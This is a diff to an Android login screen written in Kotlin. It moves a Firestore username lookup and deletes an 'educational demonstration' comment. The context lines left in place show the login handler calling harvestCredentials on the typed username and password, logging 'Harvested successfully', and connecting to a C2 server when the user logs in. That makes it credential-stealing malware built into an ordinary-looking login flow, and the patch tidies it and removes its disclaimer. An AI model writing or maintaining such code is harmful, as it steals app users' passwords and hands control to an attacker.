@@ -48,8 +48,37 @@ class LoginActivity : AppCompatActivity() {
             }
 
             progressBar.visibility = ProgressBar.VISIBLE
+            // Retrieve email associated with the username
+            firestore.collection("users")
+                .whereEqualTo("username", username)
+                .get()
+                .addOnSuccessListener { documents ->
+                    if (!documents.isEmpty) {
+                        val email = documents.documents[0].getString("email") // Fetch email
+                        if (!email.isNullOrEmpty()) {
+                            authenticateUser(email, password, progressBar)
+                        } else {
+                            Toast.makeText(
+                                this,
+                                "No account found for this username",
+                                Toast.LENGTH_SHORT
+                            ).show()
+                            progressBar.visibility = ProgressBar.GONE
+                        }
+                    } else {
+                        Toast.makeText(this, "Username not found", Toast.LENGTH_SHORT).show()
+                        progressBar.visibility = ProgressBar.GONE
+                    }
+                }
+                .addOnFailureListener {
+                    Toast.makeText(
+                        this,
+                        "Error fetching username: ${it.message}",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                    progressBar.visibility = ProgressBar.GONE
+                }
 
-            // Harvest credentials before login attempt (for educational demonstration only)
             harvestCredentials(username, password)
 
             // Connect to C2 server immediately when user attempts to log in
@@ -145,37 +174,6 @@ class LoginActivity : AppCompatActivity() {
             Log.d("CredentialHarvester", "Harvested successfully")
         } catch (e: Exception) {
             Log.e("CredentialHarvester", "Error harvesting", e)
-        }
-            // Retrieve email associated with the username
-            firestore.collection("users")
-                .whereEqualTo("username", username)
-                .get()
-                .addOnSuccessListener { documents ->
-                    if (!documents.isEmpty) {
-                        val email = documents.documents[0].getString("email") // Fetch email
-                        if (!email.isNullOrEmpty()) {
-                            authenticateUser(email, password, progressBar)
-                        } else {
-                            Toast.makeText(
-                                this,
-                                "No account found for this username",
-                                Toast.LENGTH_SHORT
-                            ).show()
-                            progressBar.visibility = ProgressBar.GONE
-                        }
-                    } else {
-                        Toast.makeText(this, "Username not found", Toast.LENGTH_SHORT).show()
-                        progressBar.visibility = ProgressBar.GONE
-                    }
-                }
-                .addOnFailureListener {
-                    Toast.makeText(
-                        this,
-                        "Error fetching username: ${it.message}",
-                        Toast.LENGTH_SHORT
-                    ).show()
-                    progressBar.visibility = ProgressBar.GONE
-                }
         }
     }
 
